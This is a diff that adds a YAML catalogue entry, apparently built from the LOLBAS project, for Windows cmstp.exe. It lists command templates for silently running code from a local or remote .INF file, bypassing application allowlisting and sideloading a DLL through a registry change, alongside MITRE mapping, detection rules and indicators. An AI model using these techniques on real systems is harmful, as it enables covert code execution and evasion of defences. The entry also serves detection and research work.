@@ -1,0 +1,122 @@
+id: lolbas/T1NCaW5hcmllcy9DbXN0cC55bWw/RXhlY3V0ZQ/0
+type: binary
+platform: windows
+name: Cmstp.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1218.003
+opsec:
+  noise: high
+  triggers: Execution of cmstp.exe without a VPN use case is suspicious
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp.yml
+  - https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/cmlua_or_cmstplua_uac_bypass.yml
+  - https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
+  - https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
+commands:
+- template: cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
+  comment: Silently installs a specially formatted local .INF without creating a desktop icon. The .INF
+    file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Cmstp/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Cmstp.exe
+      category: Execute
+      privileges: User
+      mitre_id: T1218.003
+      source_file: OSBinaries/Cmstp.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Cmstp.exe\nDescription: Installs or removes a Connection Manager service\
+        \ profile.\nAuthor: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: cmstp.exe /ni /s\
+        \ {PATH_ABSOLUTE:.inf}\n    Description: Silently installs a specially formatted local .INF without\
+        \ creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes\
+        \ a .SCT file using scrobj.dll.\n    Usecase: Execute code hidden within an inf file. Download\
+        \ and run scriptlets from internet.\n    Category: Execute\n    Privileges: User\n    MitreID:\
+        \ T1218.003\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10,\
+        \ Windows 11\n    Tags:\n      - Execute: INF\n  - Command: cmstp.exe /ni /s {REMOTEURL:.inf}\n\
+        \    Description: Silently installs a specially formatted remote .INF without creating a desktop\
+        \ icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using\
+        \ scrobj.dll.\n    Usecase: Execute code hidden within an inf file. Execute code directly from\
+        \ Internet.\n    Category: AWL Bypass\n    Privileges: User\n    MitreID: T1218.003\n    OperatingSystem:\
+        \ Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10\n    Tags:\n      - Execute: INF\n\
+        \      - Execute: Remote\n  - Command: cmstp.exe /nf\n    Description: cmstp.exe reads the `HKLM\\\
+        SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe\\CmstpExtensionDll` registry\
+        \ value and passes its data directly to `LoadLibrary`. By modifying this registry key and setting\
+        \ it to an attack-controlled DLL, this will sideload the DLL via `cmstp.exe`.\n    Usecase: Proxy\
+        \ execution of a malicious DLL via registry modification.\n    Category: Execute\n    Privileges:\
+        \ Administrator\n    MitreID: T1218.003\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n\
+        \      - Execute: DLL\n      - Requires: Registry Change\nFull_Path:\n  - Path: C:\\Windows\\\
+        System32\\cmstp.exe\n  - Path: C:\\Windows\\SysWOW64\\cmstp.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp.yml\n\
+        \  - Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/cmlua_or_cmstplua_uac_bypass.yml\n\
+        \  - Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml\n\
+        \  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml\n\
+        \  - IOC: Execution of cmstp.exe without a VPN use case is suspicious\n  - IOC: DotNet CLR libraries\
+        \ loaded into cmstp.exe\n  - IOC: DotNet CLR Usage Log - cmstp.exe.log\n  - IOC: Registry modification\
+        \ to HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe\\CmstpExtensionDll\n\
+        Resources:\n  - Link: https://twitter.com/NickTyrer/status/958450014111633408\n  - Link: https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80\n\
+        \  - Link: https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e\n  - Link: https://oddvar.moe/2017/08/15/research-on-cmstp-exe/\n\
+        \  - Link: https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1\n\
+        \  - Link: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp\n\
+        \  - Link: https://gist.github.com/ghosts621/ea8ad5b8a0904dd40b33f01f0e8285dc\nAcknowledgement:\n\
+        \  - Person: Oddvar Moe\n    Handle: '@oddvarmoe'\n  - Person: Nick Tyrer\n    Handle: '@NickTyrer'\n\
+        \  - Person: Naor Evgi\n    Handle: '@ghosts621'\n"
+      document_sha256: sha256:e6f6ddaf68bb4fd189633d20d228c01655a95ab0df4ba8ad78bd06cb304ccda3
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Cmstp/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1218.003
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:e8d6d300f11c69d7d9f57b87ba823d37c0fc085bcd0c59cfe8bbdcafd5e9ea19
